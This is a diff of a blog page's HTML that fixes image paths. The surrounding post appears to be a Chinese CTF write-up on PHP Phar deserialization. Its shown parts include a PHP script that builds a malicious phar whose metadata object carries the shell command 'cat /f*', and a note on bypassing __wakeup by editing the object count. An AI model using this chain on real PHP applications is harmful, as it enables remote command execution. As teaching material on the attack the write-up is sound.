@@ -26,13 +26,13 @@
 <meta property="og:site_name" content="yankun">
 <meta property="og:description" content="Phar是什么Phar是一种文件打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发。简单来说类似于ZIP和tar Phar文件结构1.stub文件标识 可以理解为一个标志，格式为xxx&lt;?php xxx; __HALT_COMPILER();?&gt;，前面内容不限，但必须以__HALT_COMPILER();来结尾，否则phar扩">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://yankun8.github.io/yankun8/blog/yankun8/blog/2025/01/23/PHP/Phar/blog/Phar/image-20250123202947693.png">
-<meta property="og:image" content="https://yankun8.github.io/yankun8/blog/yankun8/blog/2025/01/23/PHP/Phar/blog/Phar/image-20250123202851640.png">
+<meta property="og:image" content="https://yankun8.github.io/blog/blog/2025/01/23/PHP/Phar/Phar/image-20250123202947693.png">
+<meta property="og:image" content="https://yankun8.github.io/blog/blog/2025/01/23/PHP/Phar/Phar/image-20250123202851640.png">
 <meta property="article:published_time" content="2025-01-23T12:34:08.336Z">
 <meta property="article:modified_time" content="2025-01-23T12:48:23.854Z">
 <meta property="article:author" content="yankun">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://yankun8.github.io/yankun8/blog/yankun8/blog/2025/01/23/PHP/Phar/blog/Phar/image-20250123202947693.png">
+<meta name="twitter:image" content="https://yankun8.github.io/blog/blog/2025/01/23/PHP/Phar/Phar/image-20250123202947693.png">
   
   
   
@@ -352,7 +352,7 @@
 
 <p>接受两个参数，其次file_get_contents(‘php:&#x2F;&#x2F;input’)接受用户POST方式提交过来的参数，将POST提交过来的参数解码放到$pear里面</p>
 <p>，其次file_exists这个函数是检测文件或目录是否存在，但是$Adam使用phar:&#x2F;&#x2F;伪协议读取phar文件的话，自动执行<code>unserialize()</code>的操作没有依赖于<code>unserialize()</code>这个函数，而且正好在上面提及到受影响的函数中，我们最终的目标是</p>
-<p><img src="/yankun8/blog/yankun8/blog/2025/01/23/PHP/Phar/blog/Phar/image-20250123202947693.png" srcset="/blog/img/loading.gif" lazyload></p>
+<p><img src="/blog/blog/2025/01/23/PHP/Phar/Phar/image-20250123202947693.png" srcset="/blog/img/loading.gif" lazyload></p>
 <p>接下来就是构造phar文件</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">story</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eating</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$God</span>;<br>&#125;                 <br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">story</span>();<br><span class="hljs-variable">$a</span>-&gt;God=<span class="hljs-literal">true</span>;<br><span class="hljs-variable">$a</span>-&gt;eating=<span class="hljs-string">&#x27;cat /f*&#x27;</span>;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;hacker.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
@@ -363,7 +363,7 @@
 <li>PHP5 &lt; 5.6.25</li>
 <li>PHP7 &lt; 7.0.10</li>
 </ul>
-<p><img src="/yankun8/blog/yankun8/blog/2025/01/23/PHP/Phar/blog/Phar/image-20250123202851640.png" srcset="/blog/img/loading.gif" lazyload></p>
+<p><img src="/blog/blog/2025/01/23/PHP/Phar/Phar/image-20250123202851640.png" srcset="/blog/img/loading.gif" lazyload></p>
 <p>将4修改为5</p>
 <h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><ul>
 <li><p>修改后phar的文件的签名就不管用了需要重新生成一个，需要一个新的签名，签名用sha1加密，脚本如下</p>
